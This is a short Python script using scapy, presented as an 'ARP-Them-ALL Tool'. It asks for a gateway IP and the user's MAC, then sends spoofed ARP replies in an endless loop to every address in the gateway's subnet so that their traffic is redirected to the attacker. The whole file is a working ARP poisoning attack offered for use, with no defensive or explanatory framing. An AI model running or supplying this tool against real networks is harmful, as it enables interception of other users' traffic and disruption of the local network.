#!/usr/bin/python3

from scapy.all import *
from os import system

### info@emreovunc.com ###

system('clear')
print("### Welcome to ARP-Them-ALL Tool ###", "\n")

arp_packet = ARP()

gateway_ip = input("Gateway IP : ")
arp_packet.psrc = gateway_ip

my_mac = input("Your MAC : ")
arp_packet.hwsrc = my_mac

victim = gateway_ip.split('.')[0] + '.' +\
         gateway_ip.split('.')[1] + '.' +\
         gateway_ip.split('.')[2] + '.'

last_part = int(gateway_ip.split('.')[3])

while True:
    last_part += 1 if last_part < 255 else -255
    temp_victim = victim + str(last_part)
    arp_packet.pdst = temp_victim
    send(arp_packet)
